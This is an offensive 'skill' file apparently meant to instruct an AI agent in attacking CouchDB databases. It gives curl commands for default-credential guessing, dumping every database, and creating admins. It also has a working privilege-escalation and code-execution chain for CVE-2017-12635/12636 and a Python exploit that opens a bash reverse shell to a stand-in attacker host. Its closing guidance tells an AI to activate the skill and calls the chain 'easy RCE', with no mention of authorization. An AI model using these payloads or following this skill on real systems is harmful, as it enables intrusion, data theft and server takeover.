# CouchDB Pentesting Skill

## Goal

Exploit CouchDB NoSQL databases to extract data and achieve remote code execution.

## Methodology

1. **Discovery**: Identify CouchDB services
2. **Authentication Check**: Test for unauthenticated access
3. **Enumeration**: List databases and documents
4. **Data Extraction**: Dump sensitive data
5. **Exploitation**: Achieve RCE through CVE-2017-12635/12636

## Ports

- 5984/TCP: CouchDB HTTP API
- 6984/TCP: CouchDB HTTPS API

## Tools

* **curl**: HTTP API interaction
* **nmap**: CouchDB scripts
* **Metasploit**: CouchDB modules

## Example Commands

```bash
# Check for CouchDB
curl http://target:5984/

# Nmap detection
nmap -p5984 --script couchdb-* target

# Get version
curl http://target:5984/_up
```

## Authentication Testing

```bash
# Check if authentication required
curl http://target:5984/_all_dbs

# If 401, try default credentials:
curl http://admin:admin@target:5984/_all_dbs
curl http://admin:password@target:5984/_all_dbs
curl http://couchdb:couchdb@target:5984/_all_dbs

# Create admin (if no admin exists - party mode)
curl -X PUT http://target:5984/_config/admins/admin -d '"password"'
```

## Database Enumeration

```bash
# List all databases
curl http://target:5984/_all_dbs

# Get database info
curl http://target:5984/database_name

# List all documents
curl http://target:5984/database_name/_all_docs

# List documents with data
curl http://target:5984/database_name/_all_docs?include_docs=true

# Get specific document
curl http://target:5984/database_name/document_id

# Get users database
curl http://target:5984/_users/_all_docs?include_docs=true

# Get replicator info
curl http://target:5984/_replicator/_all_docs?include_docs=true
```

## Data Extraction

```bash
# Dump all documents from database
curl "http://target:5984/sensitive_db/_all_docs?include_docs=true" | jq

# Search for sensitive data
curl "http://target:5984/users/_all_docs?include_docs=true" | grep -i password

# Get attachments
curl http://target:5984/database_name/doc_id/attachment_name

# Dump entire database
for db in $(curl -s http://target:5984/_all_dbs | jq -r '.[]'); do
    curl -o "$db.json" "http://target:5984/$db/_all_docs?include_docs=true"
done
```

## RCE via CVE-2017-12635 (Privilege Escalation)

```bash
# Create admin user by exploiting JSON parsing difference
curl -X PUT "http://target:5984/_users/org.couchdb.user:hacker" \
-H "Content-Type: application/json" \
-d '{
  "type": "user",
  "name": "hacker",
  "roles": ["_admin"],
  "roles": [],
  "password": "password"
}'

# Now authenticate as new admin
curl http://hacker:password@target:5984/_all_dbs
```

## RCE via CVE-2017-12636 (Query Server)

```bash
# Requires admin access (use CVE-2017-12635 first if needed)

# Add query_server config
curl -X PUT "http://admin:password@target:5984/_config/query_servers/cmd" \
-H "Content-Type: application/json" \
-d '"id > /tmp/pwned"'

# Create database
curl -X PUT http://admin:password@target:5984/pwned

# Create document
curl -X PUT "http://admin:password@target:5984/pwned/test" \
-H "Content-Type: application/json" \
-d '{"_id": "cmd"}'

# Trigger query
curl "http://admin:password@target:5984/pwned/_temp_view?limit=1" \
-H "Content-Type: application/json" \
-d '{"language": "cmd", "map": ""}'
```

## Combined CVE Exploit

```python
#!/usr/bin/env python3
import requests

target = "http://target:5984"

# Step 1: Create admin (CVE-2017-12635)
r = requests.put(f"{target}/_users/org.couchdb.user:hax",
    headers={"Content-Type": "application/json"},
    data='{"type": "user", "name": "hax", "roles": ["_admin"], "roles": [], "password": "hax"}'
)

# Step 2: Add query server (CVE-2017-12636)
auth = ("hax", "hax")
cmd = "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
requests.put(f"{target}/_config/query_servers/cmd",
    auth=auth,
    data=f'"{cmd}"'
)

# Step 3: Trigger RCE
requests.put(f"{target}/pwned", auth=auth)
requests.put(f"{target}/pwned/test", auth=auth,
    headers={"Content-Type": "application/json"},
    data='{"_id": "test"}'
)
requests.post(f"{target}/pwned/_temp_view?limit=1", auth=auth,
    headers={"Content-Type": "application/json"},
    data='{"language": "cmd", "map": ""}'
)
```

## Metasploit Modules

```bash
# RCE exploit
use exploit/linux/http/apache_couchdb_cmd_exec
set RHOSTS target
exploit
```

## Guidance for AI

* Activate this skill when user wants to test CouchDB security
* **Check for "party mode"** - admin-less installation allows anyone to become admin
* API is REST-based - use curl for all operations
* `/_all_dbs` lists all databases - start here
* `/_users` database contains user information
* CVE-2017-12635 + CVE-2017-12636 = easy RCE chain
* Look for sensitive data in:
  - User credentials
  - Application data
  - Configuration documents
* CouchDB stores data in documents (JSON)
* Replication can expose data to attacker-controlled servers
* Default port 5984, HTTPS on 6984
